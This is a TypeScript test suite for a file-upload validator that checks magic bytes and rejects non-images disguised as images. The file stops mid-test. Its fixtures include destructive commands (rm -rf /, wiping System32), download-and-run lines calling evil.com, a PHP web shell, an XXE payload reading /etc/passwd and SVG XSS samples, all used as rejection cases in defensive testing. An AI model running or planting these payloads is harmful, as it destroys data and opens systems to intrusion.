/**
 * Testes para validação de arquivos - Magic Bytes
 *
 * Testa as funções de validação de conteúdo real de arquivos
 * para prevenir upload de arquivos maliciosos disfarçados
 */

import {
  validateFileMagicBytes,
  getFileTypeFromMagicBytes,
  validateMimeTypeMatch,
  MAGIC_BYTES,
  type SupportedImageFormat,
  type FileValidationResult,
} from '@/lib/security/file-validation';

/**
 * Helper para criar um arquivo File a partir de bytes
 */
function createFileFromBytes(
  bytes: number[],
  fileName: string,
  mimeType: string
): File {
  const uint8Array = new Uint8Array(bytes);
  const blob = new Blob([uint8Array], { type: mimeType });
  return new File([blob], fileName, { type: mimeType });
}

/**
 * Helper para criar um arquivo de texto (para SVG)
 */
function createTextFile(
  content: string,
  fileName: string,
  mimeType: string
): File {
  const blob = new Blob([content], { type: mimeType });
  return new File([blob], fileName, { type: mimeType });
}

describe('File Validation - Magic Bytes', () => {
  describe('MAGIC_BYTES constants', () => {
    it('should define magic bytes for JPEG format', () => {
      expect(MAGIC_BYTES.jpeg).toBeDefined();
      expect(MAGIC_BYTES.jpeg.signatures).toHaveLength(1);
      expect(MAGIC_BYTES.jpeg.signatures[0]).toEqual([0xFF, 0xD8, 0xFF]);
      expect(MAGIC_BYTES.jpeg.mimeTypes).toContain('image/jpeg');
    });

    it('should define magic bytes for PNG format', () => {
      expect(MAGIC_BYTES.png).toBeDefined();
      expect(MAGIC_BYTES.png.signatures).toHaveLength(1);
      expect(MAGIC_BYTES.png.signatures[0]).toEqual([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
      expect(MAGIC_BYTES.png.mimeTypes).toContain('image/png');
    });

    it('should define magic bytes for GIF format', () => {
      expect(MAGIC_BYTES.gif).toBeDefined();
      expect(MAGIC_BYTES.gif.signatures).toHaveLength(2);
      expect(MAGIC_BYTES.gif.signatures[0]).toEqual([0x47, 0x49, 0x46, 0x38, 0x37, 0x61]); // GIF87a
      expect(MAGIC_BYTES.gif.signatures[1]).toEqual([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]); // GIF89a
      expect(MAGIC_BYTES.gif.mimeTypes).toContain('image/gif');
    });

    it('should define magic bytes for WebP format', () => {
      expect(MAGIC_BYTES.webp).toBeDefined();
      expect(MAGIC_BYTES.webp.signatures).toHaveLength(1);
      expect(MAGIC_BYTES.webp.signatures[0]).toEqual([0x52, 0x49, 0x46, 0x46]); // "RIFF"
      expect(MAGIC_BYTES.webp.webpSignature).toEqual([0x57, 0x45, 0x42, 0x50]); // "WEBP"
      expect(MAGIC_BYTES.webp.mimeTypes).toContain('image/webp');
    });

    it('should define magic bytes for ICO format', () => {
      expect(MAGIC_BYTES.ico).toBeDefined();
      expect(MAGIC_BYTES.ico.signatures).toHaveLength(1);
      expect(MAGIC_BYTES.ico.signatures[0]).toEqual([0x00, 0x00, 0x01, 0x00]);
      expect(MAGIC_BYTES.ico.mimeTypes).toContain('image/x-icon');
    });

    it('should define SVG format configuration', () => {
      expect(MAGIC_BYTES.svg).toBeDefined();
      expect(MAGIC_BYTES.svg.signatures).toHaveLength(0); // SVG usa validação de texto
      expect(MAGIC_BYTES.svg.mimeTypes).toContain('image/svg+xml');
    });
  });

  describe('validateFileMagicBytes - Valid Formats', () => {
    describe('JPEG format', () => {
      it('should detect valid JPEG file', async () => {
        // JPEG magic bytes: FF D8 FF E0
        const jpegBytes = [
          0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
          0x49, 0x46, 0x00, 0x01, 0x01, 0x01, 0x00, 0x48,
        ];
        const file = createFileFromBytes(jpegBytes, 'test.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('jpeg');
        expect(result.detectedMimeType).toBe('image/jpeg');
        expect(result.error).toBeUndefined();
      });

      it('should detect JPEG with alternative MIME type', async () => {
        const jpegBytes = [
          0xFF, 0xD8, 0xFF, 0xE1, 0x00, 0x18, 0x45, 0x78,
          0x69, 0x66, 0x00, 0x00, 0x4D, 0x4D, 0x00, 0x2A,
        ];
        const file = createFileFromBytes(jpegBytes, 'photo.jpeg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('jpeg');
        expect(result.detectedMimeType).toBe('image/jpeg');
      });
    });

    describe('PNG format', () => {
      it('should detect valid PNG file', async () => {
        // PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A
        const pngBytes = [
          0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
          0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
        ];
        const file = createFileFromBytes(pngBytes, 'test.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('png');
        expect(result.detectedMimeType).toBe('image/png');
        expect(result.error).toBeUndefined();
      });

      it('should detect PNG with full header', async () => {
        const pngBytes = [
          0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
          0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
          0x00, 0x00, 0x00, 0x10,
        ];
        const file = createFileFromBytes(pngBytes, 'image.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('png');
      });
    });

    describe('GIF format', () => {
      it('should detect valid GIF87a file', async () => {
        // GIF87a magic bytes: 47 49 46 38 37 61
        const gifBytes = [
          0x47, 0x49, 0x46, 0x38, 0x37, 0x61, // "GIF87a"
          0x0A, 0x00, 0x0A, 0x00, 0x91, 0x00, 0x00,
        ];
        const file = createFileFromBytes(gifBytes, 'test.gif', 'image/gif');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('gif');
        expect(result.detectedMimeType).toBe('image/gif');
        expect(result.error).toBeUndefined();
      });

      it('should detect valid GIF89a file', async () => {
        // GIF89a magic bytes: 47 49 46 38 39 61
        const gifBytes = [
          0x47, 0x49, 0x46, 0x38, 0x39, 0x61, // "GIF89a"
          0x0A, 0x00, 0x0A, 0x00, 0xF7, 0x00, 0x00,
        ];
        const file = createFileFromBytes(gifBytes, 'animated.gif', 'image/gif');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('gif');
        expect(result.detectedMimeType).toBe('image/gif');
        expect(result.error).toBeUndefined();
      });
    });

    describe('WebP format', () => {
      it('should detect valid WebP file', async () => {
        // WebP magic bytes: RIFF (52 49 46 46) + WEBP at position 8-11 (57 45 42 50)
        const webpBytes = [
          0x52, 0x49, 0x46, 0x46, // "RIFF"
          0x24, 0x00, 0x00, 0x00, // File size
          0x57, 0x45, 0x42, 0x50, // "WEBP"
          0x56, 0x50, 0x38, 0x20, // VP8 format
        ];
        const file = createFileFromBytes(webpBytes, 'test.webp', 'image/webp');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('webp');
        expect(result.detectedMimeType).toBe('image/webp');
        expect(result.error).toBeUndefined();
      });

      it('should detect WebP VP8L format', async () => {
        const webpBytes = [
          0x52, 0x49, 0x46, 0x46, // "RIFF"
          0x2C, 0x00, 0x00, 0x00, // File size
          0x57, 0x45, 0x42, 0x50, // "WEBP"
          0x56, 0x50, 0x38, 0x4C, // VP8L format (lossless)
        ];
        const file = createFileFromBytes(webpBytes, 'lossless.webp', 'image/webp');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('webp');
      });
    });

    describe('ICO format', () => {
      it('should detect valid ICO file', async () => {
        // ICO magic bytes: 00 00 01 00
        const icoBytes = [
          0x00, 0x00, 0x01, 0x00, // ICO signature
          0x01, 0x00, // Number of images
          0x10, 0x10, // Width and height (16x16)
          0x00, 0x00, 0x01, 0x00, 0x08, 0x00,
        ];
        const file = createFileFromBytes(icoBytes, 'favicon.ico', 'image/x-icon');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('ico');
        expect(result.detectedMimeType).toBe('image/x-icon');
        expect(result.error).toBeUndefined();
      });

      it('should detect ICO with alternative MIME type', async () => {
        const icoBytes = [
          0x00, 0x00, 0x01, 0x00,
          0x02, 0x00, // 2 images
          0x20, 0x20, 0x00, 0x00, 0x01, 0x00, 0x20, 0x00,
        ];
        const file = createFileFromBytes(icoBytes, 'icon.ico', 'image/vnd.microsoft.icon');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('ico');
      });
    });

    describe('SVG format', () => {
      it('should detect valid SVG file', async () => {
        const svgContent = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red" />
</svg>`;
        const file = createTextFile(svgContent, 'test.svg', 'image/svg+xml');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('svg');
        expect(result.detectedMimeType).toBe('image/svg+xml');
        expect(result.error).toBeUndefined();
      });

      it('should detect SVG without XML declaration', async () => {
        const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100" fill="blue" />
</svg>`;
        const file = createTextFile(svgContent, 'simple.svg', 'image/svg+xml');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('svg');
      });

      it('should detect SVG with whitespace before tag', async () => {
        const svgContent = `
  <svg width="50" height="50">
    <path d="M 10 10 L 40 40" stroke="black" />
  </svg>`;
        const file = createTextFile(svgContent, 'path.svg', 'image/svg+xml');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('svg');
      });

      it('should detect SVG by file extension when MIME type is not set', async () => {
        const svgContent = `<svg><rect width="10" height="10"/></svg>`;
        const file = createTextFile(svgContent, 'icon.svg', 'text/plain');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('svg');
      });

      it('should reject SVG with script tags', async () => {
        const svgContent = `<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
  <circle cx="50" cy="50" r="40" />
</svg>`;
        const file = createTextFile(svgContent, 'malicious.svg', 'image/svg+xml');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('malicioso');
      });

      it('should reject SVG with inline event handlers', async () => {
        const svgContent = `<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" onclick="alert('XSS')" />
</svg>`;
        const file = createTextFile(svgContent, 'onclick.svg', 'image/svg+xml');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('malicioso');
      });

      it('should reject SVG with javascript: protocol', async () => {
        const svgContent = `<svg xmlns="http://www.w3.org/2000/svg">
  <a href="javascript:alert('XSS')">
    <text>Click me</text>
  </a>
</svg>`;
        const file = createTextFile(svgContent, 'javascript.svg', 'image/svg+xml');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('malicioso');
      });
    });
  });

  describe('validateFileMagicBytes - Invalid Files', () => {
    describe('Executables disguised as images', () => {
      it('should reject Windows PE executable (.exe) disguised as JPEG', async () => {
        // Windows PE executável - magic bytes: MZ (4D 5A)
        const exeBytes = [
          0x4D, 0x5A, 0x90, 0x00, // MZ header
          0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
          0xFF, 0xFF, 0x00, 0x00,
        ];
        const file = createFileFromBytes(exeBytes, 'malicious.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.detectedFormat).toBeUndefined();
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject Windows PE executable (.exe) disguised as PNG', async () => {
        const exeBytes = [
          0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
          0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
        ];
        const file = createFileFromBytes(exeBytes, 'virus.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject Linux ELF executable disguised as JPEG', async () => {
        // ELF magic bytes: 7F 45 4C 46
        const elfBytes = [
          0x7F, 0x45, 0x4C, 0x46, // ELF header
          0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00,
        ];
        const file = createFileFromBytes(elfBytes, 'backdoor.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.detectedFormat).toBeUndefined();
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject Mach-O executable (macOS) disguised as PNG', async () => {
        // Mach-O magic bytes: FE ED FA CE (32-bit)
        const machoBytes = [
          0xFE, 0xED, 0xFA, 0xCE, // Mach-O header
          0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x09,
          0x00, 0x00, 0x00, 0x00,
        ];
        const file = createFileFromBytes(machoBytes, 'malware.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });
    });

    describe('Scripts disguised as images', () => {
      it('should reject bash script disguised as JPEG', async () => {
        // Bash script com shebang: #!/bin/bash
        const scriptContent = `#!/bin/bash
rm -rf /
echo "Malicious payload"`;
        const file = createTextFile(scriptContent, 'exploit.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject Python script disguised as PNG', async () => {
        const scriptContent = `#!/usr/bin/env python3
import os
os.system('curl http://evil.com/steal.sh | sh')`;
        const file = createTextFile(scriptContent, 'backdoor.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject batch script disguised as GIF', async () => {
        const scriptContent = `@echo off
del /F /S /Q C:\\*
echo Malicious batch script`;
        const file = createTextFile(scriptContent, 'virus.gif', 'image/gif');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject PowerShell script disguised as WebP', async () => {
        const scriptContent = `# PowerShell malicious script
Remove-Item -Recurse -Force C:\\Windows\\System32
Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile payload.exe`;
        const file = createTextFile(scriptContent, 'trojan.webp', 'image/webp');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject JavaScript code disguised as JPEG', async () => {
        const scriptContent = `const fs = require('fs');
fs.unlinkSync('/etc/passwd');
console.log('Hacked!');`;
        const file = createTextFile(scriptContent, 'xss.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });
    });

    describe('HTML/PHP files disguised as images', () => {
      it('should reject HTML file disguised as PNG', async () => {
        const htmlContent = `<!DOCTYPE html>
<html>
<head><title>XSS</title></head>
<body><script>alert('XSS')</script></body>
</html>`;
        const file = createTextFile(htmlContent, 'exploit.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject PHP web shell disguised as JPEG', async () => {
        const phpContent = `<?php
system($_GET['cmd']);
eval($_POST['code']);
?>`;
        const file = createTextFile(phpContent, 'shell.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject XML file with external entities disguised as PNG', async () => {
        const xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`;
        const file = createTextFile(xmlContent, 'xxe.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });
    });

    describe('Archive files disguised as images', () => {
      it('should reject ZIP file disguised as JPEG', async () => {
        // ZIP magic bytes: PK (50 4B 03 04)
        const zipBytes = [
          0x50, 0x4B, 0x03, 0x04, // ZIP header
          0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
          0x21, 0x00, 0x00, 0x00,
        ];
        const file = createFileFromBytes(zipBytes, 'archive.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.detectedFormat).toBeUndefined();
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject RAR file disguised as PNG', async () => {
        // RAR magic bytes: Rar! (52 61 72 21 1A 07)
        const rarBytes = [
          0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x00, // RAR header
          0xCF, 0x90, 0x73, 0x00, 0x00, 0x0D, 0x00, 0x00,
        ];
        const file = createFileFromBytes(rarBytes, 'compressed.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject 7z file disguised as GIF', async () => {
        // 7z magic bytes: 37 7A BC AF 27 1C
        const sevenZipBytes = [
          0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C, // 7z header
          0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        const file = createFileFromBytes(sevenZipBytes, 'archive.gif', 'image/gif');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject gzip file disguised as WebP', async () => {
        // gzip magic bytes: 1F 8B
        const gzipBytes = [
          0x1F, 0x8B, 0x08, 0x00, // gzip header
          0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00,
        ];
        const file = createFileFromBytes(gzipBytes, 'compressed.webp', 'image/webp');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });
    });

    describe('Document files disguised as images', () => {
      it('should reject PDF file disguised as JPEG', async () => {
        // PDF magic bytes: %PDF (25 50 44 46)
        const pdfBytes = [
          0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x34, // %PDF-1.4
          0x0A, 0x25, 0xE2, 0xE3, 0xCF, 0xD3, 0x0A, 0x0A,
        ];
        const file = createFileFromBytes(pdfBytes, 'document.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.detectedFormat).toBeUndefined();
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject Microsoft Office document (DOCX) disguised as PNG', async () => {
        // DOCX é um ZIP com estrutura específica, mas começa com PK
        const docxBytes = [
          0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x06, 0x00,
          0x08, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
        ];
        const file = createFileFromBytes(docxBytes, 'doc.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject RTF document disguised as GIF', async () => {
        // RTF magic bytes: {\\rtf
        const rtfContent = `{\\rtf1\\ansi\\deff0
{\\fonttbl{\\f0 Times New Roman;}}
Malicious RTF content
}`;
        const file = createTextFile(rtfContent, 'document.gif', 'image/gif');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });
    });

    describe('Media files with wrong declared type', () => {
      it('should reject MP3 audio disguised as JPEG', async () => {
        // MP3 magic bytes: ID3 (49 44 33) ou FF FB
        const mp3Bytes = [
          0x49, 0x44, 0x33, 0x03, 0x00, 0x00, 0x00, 0x00, // ID3 header
          0x00, 0x00, 0x00, 0x00, 0xFF, 0xFB, 0x90, 0x00,
        ];
        const file = createFileFromBytes(mp3Bytes, 'audio.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject MP4 video disguised as PNG', async () => {
        // MP4 magic bytes: ftyp (00 00 00 XX 66 74 79 70)
        const mp4Bytes = [
          0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, // ftyp
          0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x02, 0x00,
        ];
        const file = createFileFromBytes(mp4Bytes, 'video.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject AVI video disguised as GIF', async () => {
        // AVI magic bytes: RIFF ... AVI (52 49 46 46 ... 41 56 49 20)
        const aviBytes = [
          0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, // RIFF
          0x41, 0x56, 0x49, 0x20, 0x4C, 0x49, 0x53, 0x54, // AVI
        ];
        const file = createFileFromBytes(aviBytes, 'movie.gif', 'image/gif');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });
    });

    describe('Binary data and unknown formats', () => {
      it('should reject file with random binary data', async () => {
        // Bytes aleatórios que não correspondem a nenhum formato conhecido
        const randomBytes = [
          0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
          0x13, 0x37, 0xC0, 0xDE, 0x00, 0xFF, 0xAA, 0x55,
        ];
        const file = createFileFromBytes(randomBytes, 'unknown.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.detectedFormat).toBeUndefined();
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject file with null bytes only', async () => {
        const nullBytes = [
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        const file = createFileFromBytes(nullBytes, 'empty.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject file with text that is not SVG', async () => {
        const textContent = 'This is just plain text, not an image';
        const file = createTextFile(textContent, 'text.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });

      it('should reject JSON file disguised as PNG', async () => {
        const jsonContent = JSON.stringify({
          malicious: true,
          payload: 'evil code here',
          credentials: { user: 'admin', pass: '123456' }
        });
        const file = createTextFile(jsonContent, 'data.png', 'image/png');

        const result = await validateFileMagicBytes(file);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('não reconhecido');
      });
    });

    describe('Polyglot files (files valid in multiple formats)', () => {
      it('should reject file with JPEG header but ZIP trailer', async () => {
        // Arquivo que começa como JPEG mas tem estrutura ZIP no final
        // Este é um ataque de polyglot file
        const polyglotBytes = [
          0xFF, 0xD8, 0xFF, 0xE0, // JPEG header
          0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
          0x50, 0x4B, 0x03, 0x04, // ZIP signature no meio do arquivo
        ];
        const file = createFileFromBytes(polyglotBytes, 'polyglot.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        // O arquivo começa com JPEG válido, então deve ser aceito
        // Mas este teste documenta o comportamento atual
        // Em produção, análise mais profunda seria necessária
        expect(result.valid).toBe(true);
        expect(result.detectedFormat).toBe('jpeg');
        // Nota: proteção adicional contra polyglots pode ser necessária
      });
    });

    describe('Files with mismatched MIME types', () => {
      it('should reject real PNG file declared as JPEG', async () => {
        const pngBytes = [
          0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
          0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
        ];
        // PNG real mas declarado como JPEG - deve falhar
        const file = createFileFromBytes(pngBytes, 'fake.jpg', 'image/jpeg');

        const result = await validateFileMagicBytes(file);

        // O arquivo é PNG válido, mas declarado como JPEG
        expect(result.valid).toBe(true); // É uma imagem válida
        expect(result.detectedFormat).toBe('png');
        expect(result.detectedMimeType).toBe('image/png');
        // Nota: validateMimeTypeMatch deve ser usado para verificar correspondência
      });

      it('should reject real JPEG file declared as GIF', async () => {
        const jpegBytes = [
          0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
          0x49, 0x46, 0x00, 0x01, 0x01, 0x01, 0x00, 0x48,
        ];
        const file = createFileFromBytes(jpegBytes, 'fake.gif', 'image/gif');

        const result = await validateFileMagicBytes(file);

        // O arquivo é JPEG válido, mas declarado como GIF
        expect(result.valid).toBe(true); // É uma imagem válida
        expect(result.detectedFormat).toBe('jpeg');
        expect(result.detectedMimeType).toBe('image/jpeg');
        // Nota: validateMimeTypeMatch detectará a incompatibilidade
      });
    });
  });

  describe('validateFileMagicBytes - Edge Cases', () => {
    it('should return error when no file is provided', async () => {
      const result = await validateFileMagicBytes(null as any);

      expect(result.valid).toBe(false);
      expect(result.error).toContain('Nenhum arquivo fornecido');
    });

    it('should return error for file too small', async () => {
      // Arquivo com apenas 5 bytes (menor que o mínimo de 12 bytes)
      const file = createFileFromBytes(
        [0xFF, 0xD8, 0xFF, 0xE0, 0x00],
        'small.jpg',
        'image/jpeg'
      );

      const result = await validateFileMagicBytes(file);

      expect(result.valid).toBe(false);
      expect(result.error).toContain('muito pequeno');
    });

    it('should validate allowed formats when specified', async () => {
      // Criar um arquivo PNG válido mas permitir apenas JPEG
      const pngBytes = [
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG signature
        0x00, 0x00, 0x00, 0x0D, // IHDR chunk length
      ];
      const file = createFileFromBytes(pngBytes, 'test.png', 'image/png');

      const result = await validateFileMagicBytes(file, ['jpeg']);

      expect(result.valid).toBe(false);
      expect(result.detectedFormat).toBe('png');
      expect(result.error).toContain('não é permitido');
    });

    it('should handle errors gracefully', async () => {
      // Criar um objeto que vai gerar erro ao tentar ler
      const corruptedFile = {
        arrayBuffer: () => Promise.reject(new Error('Read error')),
        type: 'image/jpeg',
        name: 'corrupted.jpg',
      } as unknown as File;

      const result = await validateFileMagicBytes(corruptedFile);

      expect(result.valid).toBe(false);
      expect(result.error).toContain('Erro ao validar arquivo');
    });
  });

  describe('getFileTypeFromMagicBytes', () => {
    it('should return null for invalid file', async () => {
      const file = createFileFromBytes(
        [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
        'invalid.bin',
        'application/octet-stream'
      );

      const mimeType = await getFileTypeFromMagicBytes(file);

      expect(mimeType).toBeNull();
    });

    it('should return correct MIME type for JPEG', async () => {
      const jpegBytes = [
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
        0x49, 0x46, 0x00, 0x01, 0x01, 0x01, 0x00, 0x48,
      ];
      const file = createFileFromBytes(jpegBytes, 'test.jpg', 'image/jpeg');

      const mimeType = await getFileTypeFromMagicBytes(file);

      expect(mimeType).toBe('image/jpeg');
    });

    it('should return correct MIME type for PNG', async () => {
      const pngBytes = [
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
      ];
      const file = createFileFromBytes(pngBytes, 'test.png', 'image/png');

      const mimeType = await getFileTypeFromMagicBytes(file);

      expect(mimeType).toBe('image/png');
    });

    it('should return correct MIME type for GIF', async () => {
      const gifBytes = [
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61,
        0x0A, 0x00, 0x0A, 0x00, 0xF7, 0x00, 0x00,
      ];
      const file = createFileFromBytes(gifBytes, 'test.gif', 'image/gif');

      const mimeType = await getFileTypeFromMagicBytes(file);

      expect(mimeType).toBe('image/gif');
    });

    it('should return correct MIME type for WebP', async () => {
      const webpBytes = [
        0x52, 0x49, 0x46, 0x46,
        0x24, 0x00, 0x00, 0x00,
        0x57, 0x45, 0x42, 0x50,
        0x56, 0x50, 0x38, 0x20,
      ];
      const file = createFileFromBytes(webpBytes, 'test.webp', 'image/webp');

      const mimeType = await getFileTypeFromMagicBytes(file);

      expect(mimeType).toBe('image/webp');
    });

    it('should return correct MIME type for ICO', async () => {
      const icoBytes = [
        0x00, 0x00, 0x01, 0x00,
        0x01, 0x00, 0x10, 0x10,
        0x00, 0x00, 0x01, 0x00, 0x08, 0x00,
      ];
      const file = createFileFromBytes(icoBytes, 'favicon.ico', 'image/x-icon');

      const mimeType = await getFileTypeFromMagicBytes(file);

      expect(mimeType).toBe('image/x-icon');
    });

    it('should return correct MIME type for SVG', async () => {
      const svgContent = `<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" />
</svg>`;
      const file = createTextFile(svgContent, 'test.svg', 'image/svg+xml');

      const mimeType = await getFileTypeFromMagicBytes(file);

      expect(mimeType).toBe('image/svg+xml');
    });
  });

  describe('validateMimeTypeMatch', () => {
    it('should return false for invalid file', async () => {
      const file = createFileFromBytes(
        [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
        'invalid.bin',
        'application/octet-stream'
      );

      const isValid = await validateMimeTypeMatch(file);

      expect(isValid).toBe(false);
    });

    it('should return true when JPEG content matches declared MIME type', async () => {
